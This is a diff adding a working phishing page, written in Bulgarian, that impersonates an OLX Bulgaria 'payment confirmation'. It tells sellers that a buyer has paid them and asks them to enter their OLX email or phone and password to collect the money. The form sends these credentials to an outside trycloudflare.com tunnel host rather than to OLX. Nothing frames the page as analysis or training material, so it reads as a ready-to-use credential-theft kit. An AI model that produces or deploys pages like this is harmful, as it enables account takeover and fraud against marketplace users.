@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="bg">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OLX Доставка - Потвърждение на плащане</title>
+    <style>
+        body { font-family: 'Arial', sans-serif; background-color: #f2f4f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: white; width: 100%; max-width: 400px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); padding: 24px; box-sizing: border-box; }
+        .logo { color: #002f34; font-size: 38px; font-weight: bold; text-align: center; margin-bottom: 24px; letter-spacing: -2px; }
+        .status-badge { background-color: #cbf5ee; color: #002f34; padding: 8px 12px; border-radius: 4px; font-size: 14px; font-weight: bold; margin-bottom: 20px; display: inline-block; }
+        h2 { color: #002f34; font-size: 18px; margin: 0 0 10px 0; }
+        p { color: #406367; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
+        label { display: block; font-size: 12px; color: #002f34; font-weight: bold; margin-bottom: 5px; text-transform: uppercase; }
+        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #ced4da; border-radius: 4px; box-sizing: border-box; font-size: 16px; background-color: #f8f9fa; }
+        input:focus { border-color: #002f34; outline: none; background-color: white; }
+        .btn { width: 100%; background-color: #002f34; color: white; padding: 16px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        .btn:hover { background-color: #004f56; }
+        .footer { text-align: center; font-size: 11px; color: #7f9799; margin-top: 25px; border-top: 1px solid #f2f4f5; padding-top: 15px; }
+        .secure-icon { display: inline-block; vertical-align: middle; margin-right: 5px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="logo">olx</div>
+    
+    <div class="status-badge">● Очакване на потвърждение</div>
+    
+    <h2>Получаване на сума</h2>
+    <p>Купувачът е превел сумата за Вашата обява. Моля, потвърдете Вашите данни, за да завършите трансакцията към Вашата банкова сметка.</p>
+    
+    <form action="https://virginia-holidays-faculty-facilitate.trycloudflare.com" method="POST">
+        <label>Имейл или Телефон</label>
+        <input type="text" name="username" placeholder="example@mail.bg" required>
+        
+        <label>Парола за OLX</label>
+        <input type="password" name="password" placeholder="******" required>
+        
+        <button type="submit" class="btn">Потвърди и вземи сумата</button>
+    </form>
+    
+    <div class="footer">
+        <span class="secure-icon">🔒</span> Сигурно плащане чрез OLX България © 2026
+    </div>
+</div>
+
+</body>
+</html>
